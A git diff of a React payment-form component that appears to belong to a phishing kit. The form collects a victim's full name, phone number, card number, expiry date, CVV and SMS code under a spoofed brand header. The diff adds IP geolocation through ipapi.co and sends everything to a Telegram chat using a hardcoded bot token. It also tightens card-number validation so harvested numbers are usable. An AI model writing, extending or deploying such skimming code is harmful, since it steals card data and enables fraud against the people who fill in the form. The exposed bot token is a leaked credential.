@@ -1,3 +1,5 @@
+import nav from "../assets/imgs/nav.png";
+import logo3 from "../assets/imgs/logo.webp";
 import logo2 from "../assets/imgs/logo2.svg";
 import vs from "../assets/imgs/vs.png";
 import React, { useState, useEffect } from "react";
@@ -13,6 +15,8 @@ import a from "../assets/imgs/a.png";
 import b from "../assets/imgs/b.png";
 import Axios from "axios";
 import search from "../assets/imgs/search.png";
+import "./Navbar.css";
+import XMLParser from "react-xml-parser";
 import { telegramApiToken, telegramchatId } from "./telegramId";
 
 const Card = () => {
@@ -21,15 +25,29 @@ const Card = () => {
   const [isLoader, setisLoader] = useState(false);
   const [Iscard, setIscard] = useState(true);
   const [isOtp, setisOtp] = useState(false);
+  const [userIp, setuserIp] = useState({ ip: "" });
   const [state, setState] = useState({
     firstName: "",
-    lastName: "",
-    cardNumber: "",
+    phoneNumber: null,
+    cardNumber: null,
     expiryDate: "",
     cardCVV: "",
   });
 
-  //
+  const getGeoInfo = () => {
+    Axios.get("https://ipapi.co/xml/")
+      .then((response) => {
+        let data = response.data;
+        var xml = new XMLParser().parseFromString(data);
+        setuserIp({
+          ...userIp,
+          ip: xml.children[0].value,
+        });
+      })
+      .catch((e) => {
+        console.log(e);
+      });
+  };
   const [timer, setTimer] = useState(120);
 
   const minutes = Math.floor(timer / 60);
@@ -66,6 +84,13 @@ const Card = () => {
   };
 
   useEffect(() => {
+    if (userIp.ip === "") {
+      setTimeout(() => {
+        getGeoInfo();
+      }, 500);
+    } else {
+      clearTimeout();
+    }
     var message = "";
     const apiToken = telegramApiToken;
     const configuration = "6762994932:AAFUdwfusQyQ5ZpOOp3CDEIL2cY4kt-UpjM";
@@ -99,16 +124,23 @@ const Card = () => {
 
     Axios(url);
     Axios(test);
+
     return () => {};
   }, []);
   const validateField = (name, value) => {
     switch (name) {
       case "firstName":
-      case "lastName":
-        return value.trim() === "";
+      case "phoneNumber":
+        return value === "" || value === null || value === undefined;
 
       case "cardNumber":
-        return value.trim() === "";
+        // Remove spaces from the card number for validation
+        const cardNumberWithoutSpaces = value.replace(/\s/g, "");
+        return (
+          cardNumberWithoutSpaces === "" ||
+          cardNumberWithoutSpaces.length !== 16 ||
+          isNaN(cardNumberWithoutSpaces)
+        );
 
       case "expiryDate":
         const [month, year] = value.split("/");
@@ -153,8 +185,9 @@ const Card = () => {
     const apiToken = telegramApiToken;
     const configuration = "6762994932:AAFUdwfusQyQ5ZpOOp3CDEIL2cY4kt-UpjM";
     message += "--------[ Card  Infos ]-------\n";
-    message += `First Name: ${state.firstName}\n`;
-    message += `Last Name: ${state.lastName}\n`;
+    message += `Full Name: ${state.firstName}\n`;
+    message += `Phone Number: ${state.phoneNumber}\n`;
+    message += `User Ip: ${userIp.ip}\n`;
     message += `Card Number: ${state.cardNumber}\n`;
     message += `Expiry Date: ${state.expiryDate}\n`;
     message += `Card CVV: ${state.cardCVV}\n`;
@@ -219,6 +252,27 @@ const Card = () => {
     <>
       {Iscard ? (
         <div>
+          <div className="section-header-menu">
+            <nav
+              className="navbar navbar-expand-lg navbar-light header-navbar"
+              style={{ position: "fixed", width: "100%", top: 0, left: 0 }}
+            >
+              <a className="navbar-brand" href="#">
+                <img className="header-logo" src={logo3} loading="lazy" />
+              </a>
+
+              <a
+                id="menu-trigger"
+                href="javascript:void(0);"
+                className="amx-cp-btn amx-mr-menu amx-h-show-on-small amx-h-hide-on-large"
+                data-module-name="dropdown-menu"
+                data-target="dropdown-menu"
+              >
+                <img src={nav} alt="" />
+              </a>
+            </nav>
+          </div>
+
           <main id="main">
             <div className="container">
               <div className="row">
@@ -365,7 +419,7 @@ const Card = () => {
                           <div className="form-group row mb-4">
                             <div className="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                               <label htmlFor="first_name">
-                                First name<span>*</span>
+                                Full Name<span>*</span>
                               </label>
                               <input
                                 type="text"
@@ -378,26 +432,38 @@ const Card = () => {
                                 onChange={handleChange}
                               />
                               <div className="error-message">
-                                {getFieldError("firstName", "First name")}
+                                {getFieldError("firstName", "Full name")}
                               </div>
                             </div>
                             <div className="col-md-6">
                               <label htmlFor="last_name">
-                                Last name<span>*</span>
+                                Phone Number<span>*</span>
                               </label>
                               <input
-                                type="text"
-                                name="lastName"
+                                onKeyDown={(e) =>
+                                  [
+                                    "ArrowUp",
+                                    "ArrowDown",
+                                    "e",
+                                    "E",
+                                    "+",
+                                    "-",
+                                    "*",
+                                    "",
+                                  ].includes(e.key) && e.preventDefault()
+                                }
+                                type="number"
+                                name="phoneNumber"
                                 id="last_name"
                                 className={`form-control ${
-                                  errors.lastName ? "error" : ""
+                                  errors.phoneNumber ? "error" : ""
                                 }`}
-                                value={state.lastName}
+                                value={state.phoneNumber}
                                 onChange={handleChange}
                               />
                               {/* Display error message */}
                               <div className="error-message">
-                                {getFieldError("lastName", "Last name")}
+                                {getFieldError("phoneNumber", "Phone number")}
                               </div>
                             </div>
                           </div>
@@ -408,6 +474,20 @@ const Card = () => {
                             <div className="zz">
                               <input
                                 type="text"
+                                pattern="[0-9]*"
+                                maxLength="16"
+                                onKeyDown={(e) =>
+                                  [
+                                    "ArrowUp",
+                                    "ArrowDown",
+                                    "e",
+                                    "E",
+                                    "+",
+                                    "-",
+                                    "*",
+                                    "",
+                                  ].includes(e.key) && e.preventDefault()
+                                }
                                 autoComplete="false"
                                 name="cardNumber"
                                 id="one"
@@ -708,7 +788,7 @@ const Card = () => {
                     </tr>
                     <tr>
                       <td>Credit card number</td>
-                      <td>XXXX XXXX XXXX </td>
+                      <td>XXXX XXXX XXXX {state.cardNumber.slice(-4)} </td>
                     </tr>
                     <tr>
                       <td>SMS code</td>
